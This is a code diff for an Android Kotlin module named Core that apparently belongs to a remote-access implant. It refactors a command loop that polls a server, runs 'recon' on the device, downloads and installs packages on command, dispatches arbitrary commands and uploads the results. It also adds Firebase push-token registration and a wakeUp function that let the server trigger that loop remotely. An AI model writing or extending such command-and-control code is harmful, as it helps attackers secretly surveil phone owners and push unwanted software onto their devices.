@@ -5,6 +5,7 @@ import android.content.Intent
 import android.net.Uri
 import android.os.Build
 import android.util.Log
+import com.google.firebase.messaging.FirebaseMessaging
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -31,41 +32,25 @@ object Core {
                 Transport.registerDevice(deviceId, fingerprint)
                 Log.d(TAG, "Device registered")
 
+                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+                    if (task.isSuccessful) {
+                        val token = task.result
+                        if (token != null) {
+                            Transport.saveFcmToken(deviceId, token)
+                            Log.d(TAG, "FCM token saved")
+                        }
+                    }
+                }
+
                 var lastPoll = 0L
                 var lastHeartbeat = 0L
-                var firstRun = true
 
                 while (running) {
                     val now = System.currentTimeMillis()
 
                     if (now - lastPoll >= Config.POLL_INTERVAL_MS) {
                         lastPoll = now
-                        try {
-                            val commands = Transport.pollCommands(deviceId)
-                            if (commands.isNotEmpty()) {
-                                for ((cmdId, cmd) in commands) {
-                                    Log.d(TAG, "Executing: $cmd")
-                                    Transport.markCommandRunning(cmdId)
-
-                                    val result = if (cmd == "recon") {
-                                        Recon.execute(context)
-                                    } else if (cmd.startsWith("download|")) {
-                                        downloadAndInstall(context, cmd.removePrefix("download|"))
-                                    } else if (cmd == "die") {
-                                        running = false
-                                        "BYE"
-                                    } else {
-                                        Commands.dispatch(context, cmd)
-                                    }
-
-                                    Transport.sendResult(cmdId, deviceId, result)
-                                    Transport.markCommandCompleted(cmdId)
-                                    Log.d(TAG, "Result sent: ${cmd.take(20)} (${result.length} bytes)")
-                                }
-                            }
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Poll error: ${e.message}")
-                        }
+                        pollAndExecute(context)
                     }
 
                     if (now - lastHeartbeat >= Config.HEARTBEAT_INTERVAL_MS) {
@@ -81,6 +66,48 @@ object Core {
                 Log.e(TAG, "Core error: ${e.message}")
                 running = false
             }
+        }
+    }
+
+    fun wakeUp(context: Context) {
+        if (!running) {
+            start(context)
+        }
+        scope.launch {
+            try {
+                pollAndExecute(context)
+            } catch (e: Exception) {
+                Log.e(TAG, "WakeUp poll error: ${e.message}")
+            }
+        }
+    }
+
+    private fun pollAndExecute(context: Context) {
+        try {
+            val commands = Transport.pollCommands(deviceId)
+            if (commands.isNotEmpty()) {
+                for ((cmdId, cmd) in commands) {
+                    Log.d(TAG, "Executing: $cmd")
+                    Transport.markCommandRunning(cmdId)
+
+                    val result = if (cmd == "recon") {
+                        Recon.execute(context)
+                    } else if (cmd.startsWith("download|")) {
+                        downloadAndInstall(context, cmd.removePrefix("download|"))
+                    } else if (cmd == "die") {
+                        running = false
+                        "BYE"
+                    } else {
+                        Commands.dispatch(context, cmd)
+                    }
+
+                    Transport.sendResult(cmdId, deviceId, result)
+                    Transport.markCommandCompleted(cmdId)
+                    Log.d(TAG, "Result sent: ${cmd.take(20)} (${result.length} bytes)")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Poll error: ${e.message}")
         }
     }
 
